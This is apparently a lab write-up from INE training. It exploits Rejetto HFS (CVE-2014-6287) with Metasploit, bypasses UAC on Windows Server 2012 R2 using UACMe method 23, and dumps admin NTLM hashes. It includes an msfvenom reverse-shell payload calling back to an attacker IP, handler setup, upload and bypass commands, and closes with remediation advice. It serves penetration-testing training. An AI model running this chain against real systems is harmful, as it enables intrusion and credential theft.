---
title: "UAC Bypass: UACMe"
description: "Exploiting Rejetto HFS for a medium-integrity session as a UAC-limited admin, then bypassing UAC with UACMe (Akagi, method 23) to run an elevated payload and obtain a high-integrity session for dumping the admin NTLM hash."
date: 2025-11-04
platform: "INE Labs"
difficulty: "Medium"
tags: ["UAC Bypass", "UACMe", "Akagi", "Rejetto HFS", "CVE-2014-6287", "msfvenom", "Metasploit", "Windows"]
cover: "./photo2.png"
---

# UAC Bypass: UACMe

**Classification:** Host & Network Penetration Testing / System & Host-Based Attacks<br>
**Target:** demo.ine.local (10.2.17.112) — VICTIM, Windows Server 2012 R2 (6.3 Build 9600)<br>
**Attacker:** 10.10.49.3 (Kali)<br>
**Objective:** Gain the highest privilege and obtain the admin NTLM hash.<br>
**Tool:** UACMe (`/root/Desktop/tools/UACME/`)

## 1. Executive Summary

We exploit **Rejetto HFS 2.3** (CVE-2014-6287) for a Meterpreter session as `VICTIM\admin`.
Although `admin` is in the Administrators group, UAC keeps the token at medium integrity, so
privileged actions are denied. We bypass UAC with **UACMe** (`Akagi64.exe`, method 23),
which auto-elevates and runs our payload, returning a **high-integrity** session with the
full admin privilege set — enough to dump the admin NTLM hash.

## 2. Recon

```bash
ping -c 4 demo.ine.local
nmap -sV -O -p- 10.2.17.112
```

Port 80 runs **HttpFileServer httpd 2.3** (Rejetto HFS); also WinRM (5985), RDP, SMB.

![Ping target](./photo1.png)

![nmap — Rejetto HFS and Windows services](./photo2.png)

## 3. Exploiting Rejetto HFS

```bash
# global RHOSTS/LHOST set
use exploit/windows/http/rejetto_hfs_exec
exploit
```

![MSF global variables](./photo3.png)

![Rejetto HFS web service found](./photo4.png)

![Meterpreter session opened](./photo5.png)

Confirming the OS and migrating into `explorer.exe` for a stable x64 session.

![sysinfo — Windows Server 2012 R2](./photo6.png)

![Migrated to explorer.exe](./photo7.png)

## 4. UAC-Limited Context

The session runs as `VICTIM\admin` but with a stripped privilege set — UAC is filtering the
token.

```bash
getuid              # VICTIM\admin
getprivs            # only SeChangeNotify, SeShutdown, ... (limited)
```

![getprivs — limited privileges (UAC)](./photo8.png)

`admin` and `Administrator` are distinct users, both in the local Administrators group;
privileged actions still trigger the UAC prompt.

![net user / localgroup — Administrators members](./photo9.png)

## 5. Preparing the UACMe Payload

Generating the elevated payload to be launched by UACMe.

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.49.3 LPORT=1234 -f exe > backdoor.exe
```

![msfvenom — backdoor.exe](./photo10.png)

Starting a handler for it.

```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.49.3
set LPORT 1234
run
```

![multi/handler listening](./photo11.png)

## 6. Uploading the Tools

Creating `C:\Temp` and uploading the backdoor plus `Akagi64.exe`.

```bash
mkdir C:\\Temp
upload backdoor.exe C:\\Temp\\backdoor.exe
upload Akagi64.exe C:\\Temp\\Akagi64.exe
```

![Uploading backdoor and Akagi64](./photo12.png)

Confirming the files from a shell (running `backdoor.exe` directly would still hit UAC).

```cmd
shell
cd C:\Temp
dir                 # Akagi64.exe, backdoor.exe
```

![C:\Temp listing](./photo13.png)

## 7. Bypassing UAC (Akagi, method 23)

```cmd
.\Akagi64.exe 23 C:\Temp\backdoor.exe
```

![Running Akagi64 method 23](./photo14.png)

The handler receives a new session — same user `VICTIM\admin`, now with a **full,
high-integrity** privilege set (`SeDebugPrivilege`, `SeImpersonatePrivilege`,
`SeTakeOwnershipPrivilege`, ...).

```bash
getuid              # VICTIM\admin
getprivs            # full administrator privilege set
```

![Elevated high-integrity session](./photo15.png)

With this session, `hashdump` (or Kiwi) dumps the SAM to recover the **admin NTLM hash**.

## 8. Remediation Recommendations

1. **Patch/replace Rejetto HFS** — CVE-2014-6287 is unauthenticated RCE.
2. **Set UAC to the highest level** ("Always notify") and avoid auto-elevating
   (`ConsentPromptBehaviorAdmin`) so UACMe methods are blocked.
3. **Apply current patches** — most UACMe methods target known auto-elevation bugs.
4. **Protect the SAM/LSASS** (Credential Guard) and apply least privilege to day-to-day
   admin accounts.
